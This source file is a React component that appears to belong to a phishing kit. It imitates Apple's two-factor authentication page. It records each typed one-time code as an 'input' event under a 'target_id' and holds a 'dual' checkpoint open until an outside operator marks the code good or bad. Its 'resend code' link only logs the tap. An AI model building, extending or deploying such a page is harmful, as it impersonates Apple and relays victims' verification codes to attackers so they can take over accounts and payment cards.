'use client';
import { useEffect, useRef, useState } from 'react';
import "./Otp.scss";
import addIntakeEvent from '@/app/(tropic)/addIntakeEvent';
import { PiWarningOctagonFill } from 'react-icons/pi';
import { PulseLoader } from 'react-spinners';
import { getTargetId } from '@/app/(tropic)/getTargetId';
import checkForExistingCheckpoint from '@/app/(tropic)/checkForExistingCheckpoint';
import proceedStep from '@/app/(tropic)/proceedStep';
import clientResolveDualCheckpoint from '@/app/(tropic)/resolveDualCheckpoint';
import { OTPInput } from '../OTPInput/OTPInput';
import { RotatingLines } from 'react-loader-spinner';
import { AiOutlineExclamationCircle } from "react-icons/ai";
import { getBrowserTRPCClient } from '@/app/utils/trpc/client';


export default function Otp() {
    const [loading, setLoading] = useState(false);
    const [selected, setSelected] = useState(false);
    const [error, setError] = useState('');
    const [code, setCode] = useState('');
    const [resending, setResending] = useState(false);
    const checkpointUnsubscribeRef = useRef(null);
    const checkpointPollRef = useRef(null);


    async function handleSubmit(e) {
        e?.target?.checkValidity && e.target.checkValidity();
        e?.preventDefault && e.preventDefault();
        if (loading) return;
        if (code?.length != 6) return;

        setLoading(true);
        setError('');
        const targetId = await getTargetId();
        addIntakeEvent({
            type: 'input',
            input_title: 'OTP',
            input_value: code,
            target_id: targetId
        });
        addIntakeEvent({
            target_id: targetId,
            type: 'interaction',
            interaction_title: 'Submit OTP',
        });
        if (!(await checkForExistingCheckpoint('Valid OTP confirmation'))) {
            await addIntakeEvent({
                target_id: await getTargetId(),
                type: 'checkpoint',
                checkpoint_status: 'waiting',
                checkpoint_resolution: 'Valid OTP confirmation',
                checkpoint_type: 'dual'
            })
        }
        await subscribeToIntakeEvents();
    }
    async function subscribeToIntakeEvents() {
        try {
            const trpc = getBrowserTRPCClient();
            const targetId = await getTargetId();
            checkpointUnsubscribeRef.current?.();
            if (checkpointPollRef.current) {
                clearInterval(checkpointPollRef.current);
                checkpointPollRef.current = null;
            }
            let resolved = false;
            const handleResolution = (outcome) => {
                if (resolved) return;
                resolved = true;
                checkpointUnsubscribeRef.current?.();
                checkpointUnsubscribeRef.current = null;
                if (checkpointPollRef.current) {
                    clearInterval(checkpointPollRef.current);
                    checkpointPollRef.current = null;
                }
                if (outcome === 'good') {
                    proceedStep();
                } else if (outcome === 'bad') {
                    setError('Incorrect verification code');
                    setCode('');
                    setLoading(false);
                }
            };
            const subscription = trpc.checkpoints.onResolution.subscribe(
                {
                    targetId,
                    resolution: 'Valid OTP confirmation',
                },
                {
                    onData: (payload) => {
                        console.log('Checkpoint update:', payload);
                        handleResolution(payload?.row?.checkpoint_dual_outcome);
                    },
                    onError: (error) => {
                        console.error('Error subscribing in otp:', error)
                    },
                }
            );
            checkpointUnsubscribeRef.current = () => subscription.unsubscribe();
            checkpointPollRef.current = setInterval(async () => {
                try {
                    const latest = await trpc.checkpoints.latest.query({
                        targetId,
                        resolution: 'Valid OTP confirmation',
                    });
                    if (latest?.checkpoint_status === 'resolved') {
                        handleResolution(latest?.checkpoint_dual_outcome);
                    }
                } catch (error) {
                    console.error('Checkpoint polling error:', error);
                }
            }, 1500);
        } catch (error) {
            console.error('Error subscribing in passwordform:', error)
        }
    }
    useEffect(() => {
        return () => {
            checkpointUnsubscribeRef.current?.();
            if (checkpointPollRef.current) clearInterval(checkpointPollRef.current);
        };
    }, []);
    useEffect(() => {
        // if the user reloads the page, get rid of the 
        // checkpoint since they're no longer waiting
        async function clearCheckpoint() {
            if (await checkForExistingCheckpoint('Valid OTP confirmation')) {
                clientResolveDualCheckpoint('Valid OTP confirmation', 'stale');
            }
        }
        clearCheckpoint();
    }, [])

    async function handleResend(e) {
        e.preventDefault();
        if (resending || loading) return;
        setResending(true);
        setLoading(true);
        setTimeout(() => {
            setResending(false);
            setLoading(false);
        }, 2600);
        addIntakeEvent({
            type: 'interaction',
            interaction_title: 'Tapped resend code',
            target_id: await getTargetId()
        });
    }
    useEffect(() => {
        console.log("code:", code);
        console.log("code.length:", code.length ?? 0);
        
        if (code?.length === 6) {
            handleSubmit();
        }
    }, [code]);
    return (
        <div className="Otp Main">
            <form
                data-otp-error={error ? true : false}
                onSubmit={e => e.preventDefault()}
                className="card">
                <img className='appleAcc' src="/apple-acc.svg" />
                <h2>
                    Two-Factor Authentication
                </h2>
                <OTPInput
                    value={code}
                    onChange={setCode}
                    //onComplete={() => handleSubmit()}
                    length={6}
                    autoFocus={true}
                    disabled={loading}
                    required={true}
                    className="otpInput"
                    inputClassName="otpInputField"
                    onFocus={() => setError('')}
                    allowAlphanumeric={false}
                    aria-label="Enter verification code"
                    aria-describedby="otp-input-description"
                />
                {error &&
                    <div className="error">
                        <AiOutlineExclamationCircle className='errorIcon' />
                        <span>{error}</span>
                    </div>
                }
                <p className='instruct'>
                    Enter the verification code sent to your Apple devices.
                </p>
                <a
                    data-resending={resending}
                    onClick={e => handleResend(e)}
                    className='resend'>
                    {resending ?
                        <>
                            <RotatingLines
                                width='20'
                                className='resendSpinner'
                                strokeColor='#0071e3'
                            />
                            <span>Resending verification code...</span>
                        </> :
                        <span>
                            Resend code to devices
                        </span>
                    }
                </a>
                <div className="sep" />
                <p className='uhoh'>
                    If you can't enter a code because you lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
                </p>
            </form>
        </div>
    )
}